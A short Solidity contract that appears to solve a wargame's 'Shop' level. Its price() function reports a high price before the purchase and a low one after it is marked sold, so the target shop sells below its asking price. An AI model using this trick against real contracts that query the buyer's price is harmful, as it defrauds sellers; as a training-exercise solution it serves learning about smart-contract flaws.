// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract ShopAttack is Broadcasted {
    address private s_shop;

    function attack(address payable shopCtr_) public payable override {
        IShop(shopCtr_).buy();
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        // intentionally not broadcasted to make the call from this contract
        _setShop(levelInstanceCtr_);
        attack(levelInstanceCtr_);
    }

    function price() external view returns (uint) {
        if (!IShop(s_shop).isSold()) {
            return 100;
        } else {
            return 10;
        }
    }

    function _setShop(address shop_) private {
        s_shop = shop_;
    }
}

interface IShop {
    //! to hack this level have to have a function that returns price depending on if the object is sell or not
    function isSold() external view returns (bool);

    function buy() external;
}
